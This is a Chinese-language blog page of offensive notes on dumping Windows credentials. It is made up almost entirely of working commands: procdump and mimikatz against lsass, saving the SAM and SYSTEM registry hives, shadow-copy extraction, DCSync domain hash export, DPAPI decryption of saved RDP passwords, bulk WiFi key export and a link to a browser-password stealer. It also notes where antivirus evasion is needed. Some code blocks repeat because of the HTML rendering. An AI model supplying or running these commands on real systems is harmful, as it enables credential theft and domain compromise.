<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>凭证导出</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>凭证导出</h2><p>记录一些Windows凭证导出tips</p>
<h1 id="0x1-离线导出Hash"><a href="#0x1-离线导出Hash" class="headerlink" title="0x1 离线导出Hash"></a>0x1 离线导出Hash</h1><p>前提条件是都需要管理员的方式</p>
<h2 id="0x1-1-procdump"><a href="#0x1-1-procdump" class="headerlink" title="0x1.1 procdump"></a>0x1.1 procdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs shell">procdump64.exe  -accepteula  -ma lsass.exe C:\Users\lsass.dmp<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 自带压缩软件压缩一下</span><br>makecab c:\jboss\bin\1.dmp  1.zip<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">procdump64.exe  -accepteula  -ma lsass.exe C:\Users\lsass.dmp<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 自带压缩软件压缩一下</span><br>makecab c:\jboss\bin\1.dmp  1.zip<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> mimikatz解析</span><br>mimikatz.exe "log log.txt" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit<br></code></pre></td></tr></table></figure>

<img src="/2022/06/11/%E5%87%AD%E8%AF%81%E5%AF%BC%E5%87%BA/image-20220814154202827.png" alt="image-20220814154202827" style="zoom:50%;">

<h2 id="0x1-2-reg"><a href="#0x1-2-reg" class="headerlink" title="0x1.2 reg"></a>0x1.2 reg</h2><p>大概率会被360发现</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs shell">reg save HKLM\SAM C:\Users\SamBkup.hiv<br>reg save HKLM\SYSTEM C:\Users\SystemBkup.hiv <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">reg save HKLM\SAM C:\Users\SamBkup.hiv<br>reg save HKLM\SYSTEM C:\Users\SystemBkup.hiv <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> mimikatz 解析</span><br>mimikatz.exe "lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv" exit<br></code></pre></td></tr></table></figure>

<img src="/2022/06/11/%E5%87%AD%E8%AF%81%E5%AF%BC%E5%87%BA/image-20220814163829880.png" alt="image-20220814163829880" style="zoom:50%;">

<h2 id="0x1-3-影卷复制"><a href="#0x1-3-影卷复制" class="headerlink" title="0x1.3 影卷复制"></a>0x1.3 影卷复制</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">vssadmin create shadow /for=C:<br>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.save<br>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.save<br></code></pre></td></tr></table></figure>

<h1 id="0x2-在线导出Hash-密码"><a href="#0x2-在线导出Hash-密码" class="headerlink" title="0x2 在线导出Hash/密码"></a>0x2 在线导出Hash/密码</h1><h2 id="0x2-1-在线导出本地hash-密码"><a href="#0x2-1-在线导出本地hash-密码" class="headerlink" title="0x2.1 在线导出本地hash/密码"></a>0x2.1 在线导出本地hash/密码</h2><p>主要是dump lsass进程，mimikatz需要免杀处理</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full"<br></code></pre></td></tr></table></figure>



<h2 id="0x2-2-网络导出域控hash"><a href="#0x2-2-网络导出域控hash" class="headerlink" title="0x2.2 网络导出域控hash"></a>0x2.2 网络导出域控hash</h2><p>需要有dcsync的权限，可以通过ldap的acl搜索</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">mimikatz # lsadump::dcsync /domain:test.com /all /csv<br></code></pre></td></tr></table></figure>



<h1 id="0x3-rdp相关"><a href="#0x3-rdp相关" class="headerlink" title="0x3. rdp相关"></a>0x3. rdp相关</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查看本地连接过哪些rdp</span><br>reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s<br></code></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查看保存在本地的远程主机信息</span><br>cmdkey /list<br></code></pre></td></tr></table></figure>

<p>解密RDP</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查看本地是否存在RDP密码文件</span><br>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br><span class="hljs-meta">#</span><span class="bash">解析</span><br>mimikatz # privilege::debug<br>mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\A5FA65905EC73425374412F3A66BF4F3<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 如果是离线的解密，加载事先dump下来的lsass，如果没有使用procdump重新dump即可</span><br><span class="hljs-meta">#</span><span class="bash"> 如果是CS或者本机器则可以省略本步骤</span><br>mimikatz #sekurlsa::minidump lsass.dmp<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 根据guidMasterKey找到对应的Masterkey</span><br>mimikatz # sekurlsa::dpapi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查看本地是否存在RDP密码文件</span><br>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br><span class="hljs-meta">#</span><span class="bash">解析</span><br>mimikatz # privilege::debug<br>mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\A5FA65905EC73425374412F3A66BF4F3<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 如果是离线的解密，加载事先dump下来的lsass，如果没有使用procdump重新dump即可</span><br><span class="hljs-meta">#</span><span class="bash"> 如果是CS或者本机器则可以省略本步骤</span><br>mimikatz #sekurlsa::minidump lsass.dmp<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 根据guidMasterKey找到对应的Masterkey</span><br>mimikatz # sekurlsa::dpapi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 通过Masterkey解密出明文RDP连接密码。</span><br>mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\A5FA65905EC73425374412F3A66BF4F3 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d<br></code></pre></td></tr></table></figure>

<p><img src="/2022/06/11/%E5%87%AD%E8%AF%81%E5%AF%BC%E5%87%BA/image-20220814180009512.png" alt="image-20220814180009512"></p>
<h1 id="0x4-Wifi"><a href="#0x4-Wifi" class="headerlink" title="0x4 Wifi"></a>0x4 Wifi</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查wifi名称</span><br>netsh wlan show profile <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 导出wifi密码</span><br>netsh wlan show profile ChinaNet-4GDLZ8 key=clear<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查wifi名称</span><br>netsh wlan show profile <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 导出wifi密码</span><br>netsh wlan show profile ChinaNet-4GDLZ8 key=clear<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 导出所有wifi密码</span><br>for /f "skip=9 tokens=1,2 delims=:" %i in (&#x27;netsh wlan show profiles&#x27;) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear<br><br></code></pre></td></tr></table></figure>



<h1 id="0x5-浏览器密码"><a href="#0x5-浏览器密码" class="headerlink" title="0x5 浏览器密码"></a>0x5 浏览器密码</h1><p>需要免杀处理一下</p>
<p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>